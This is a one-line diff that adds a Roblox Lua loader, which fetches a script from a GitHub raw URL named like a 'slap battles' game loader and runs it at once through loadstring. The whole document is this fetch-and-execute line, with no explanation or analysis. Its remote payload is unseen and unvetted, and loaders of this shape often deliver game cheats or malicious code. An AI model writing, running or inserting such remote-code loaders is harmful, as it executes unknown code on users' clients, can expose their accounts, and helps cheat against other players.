@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/update-slap-battles-spam0-5yfxtslho5uo3e.lua"))()
